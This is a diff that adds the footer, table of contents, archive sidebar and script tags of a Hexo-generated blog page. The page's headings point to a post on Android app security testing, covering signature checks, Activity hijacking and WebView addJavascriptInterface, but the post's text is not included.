+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#客户端安全"><span class="toc-number">1.</span> <span class="toc-text">客户端安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#签名安全"><span class="toc-number">1.1.</span> <span class="toc-text">签名安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测目的"><span class="toc-number">1.1.1.</span> <span class="toc-text">检测目的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法"><span class="toc-number">1.1.2.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测详情"><span class="toc-number">1.1.3.</span> <span class="toc-text">检测详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议"><span class="toc-number">1.1.4.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关背景"><span class="toc-number">1.1.5.</span> <span class="toc-text">相关背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">1.1.6.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">1.1.7.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Activity劫持"><span class="toc-number">1.2.</span> <span class="toc-text">Activity劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测目的-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">检测目的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关背景-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">相关背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebView命令执行漏洞-addJavascriptInterface"><span class="toc-number">1.3.</span> <span class="toc-text">WebView命令执行漏洞 - addJavascriptInterface</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测目的-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">检测目的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测详情-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">检测详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关背景-2"><span class="toc-number">1.3.5.</span> <span class="toc-text">相关背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考-2"><span class="toc-number">1.3.6.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href="/2019/07/28/记一次APP加密通信后的分析过程/">记一次APP加密通信后的分析过程</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/【整理笔记】Android APP基础安全测试/">【整理笔记】Android APP基础安全测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/【整理笔记】格式化字符串漏洞梳理/">【整理笔记】格式化字符串漏洞梳理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href="/2018/07/26/【Reverse】某CTF在线培训平台Reverse题/">【Reverse】某CTF在线培训平台Reverse题</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="整理笔记"><span class="iconfont-archer">&#xe606;</span>整理笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向"><span class="iconfont-archer">&#xe606;</span>逆向</span>
+    
+        <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="移动安全"><span class="iconfont-archer">&#xe60a;</span>移动安全</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="二进制"><span class="iconfont-archer">&#xe60a;</span>二进制</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Fanxs"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
